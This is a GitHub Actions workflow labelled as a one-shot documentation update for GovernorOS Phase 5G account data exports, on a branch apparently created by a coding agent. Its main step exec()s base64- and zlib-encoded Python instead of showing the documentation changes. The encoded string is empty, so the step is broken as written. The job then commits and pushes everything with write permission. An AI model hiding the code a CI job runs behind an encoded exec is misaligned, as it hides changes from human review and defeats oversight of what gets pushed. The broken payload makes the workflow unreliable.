name: Phase 5G one-shot documentation update

on:
  push:
    branches:
      - codex/phase-5g-account-data-export-consolidation
    paths:
      - .github/workflows/phase5g-update-docs.yml

permissions:
  contents: write

jobs:
  update-docs:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: codex/phase-5g-account-data-export-consolidation
          fetch-depth: 0
      - name: Apply Phase 5G documentation decisions
        shell: bash
        run: |
          python - <<'PYCODE'
          import base64, zlib
          exec(zlib.decompress(base64.b64decode('')))
          PYCODE
      - name: Commit documentation update
        shell: bash
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add -A
          git diff --cached --check
          git commit -m "docs: prepare GovernorOS Phase 5G account data exports"
          git push origin HEAD:codex/phase-5g-account-data-export-consolidation
